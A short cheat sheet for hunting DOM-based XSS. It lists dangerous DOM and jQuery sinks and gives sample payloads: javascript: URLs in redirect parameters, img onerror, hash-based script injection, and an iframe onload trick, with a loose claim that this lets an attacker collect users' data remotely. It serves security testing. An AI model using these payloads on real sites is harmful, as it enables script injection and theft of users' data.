### The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:   
`document.write()` | `document.writeln()` | `document.domain` | `element.innerHTML` | `element.outerHTML` | `element.insertAdjacentHTML` | `element.onevent`

### The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
`add()` | `after()` | `append()` | `animate()` | `insertAfter()` | `insertBefore()` | `before()` | `html()` | `prepend()` | `replaceWith()` | `wrap()` | `wrapInner()` | `wrapAll()` | `has()` | `constructor()` | `init()` | `index()` | `jQuery.parseHTML()` | `$.parseHTML()`

▪ Identifying Weaknesses in Input Handling:

• Look for the direct usage of these inputs in dangerous functions, such as:
  - `eval()`, `setTimeout()`, or `setInterval()` when passing string values.
  - `innerHTML` or `outerHTML`, which may directly render content.
  - `document.write()` or `document.writeln()`.
  - `addEventListener()` or any function that executes JavaScript code based on user inputs.
  - As soon as you find the first link followed by a secondary link, the parameter is usually named `returnurl`, `url`, or `returnpath`. Inject the code javascript:confirm() into it, or look for bypass techniques.
  - Example: `?returnUrl=javascript:alert(document.domain)`

- If the application displays content based on `document.location.hash`:
  Example: 
  ```html
  http://example.com/#<script>alert('XSS')</script>
  ```

- When using `innerHTML` with unsanitized data:
  Example: 
  ```html
  <img src=x onerror=alert('XSS')>
  ```

- Using functions like `eval()` with URL parameters:
  Example: 
  ```html
  http://example.com/?input=alert('XSS')
  ```

- First, we create a regular `.txt` file, let's assume its name is `xss.txt`. Then, we write the following code inside it:
  ```html
  <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
  ```

- Next, we convert the file to an HTML file like this:
  `xss.txt -> xss.html`, and then open the file. What happens is that we can pull data remotely. So, if we set up a server, we can remotely collect a copy of the user's data.
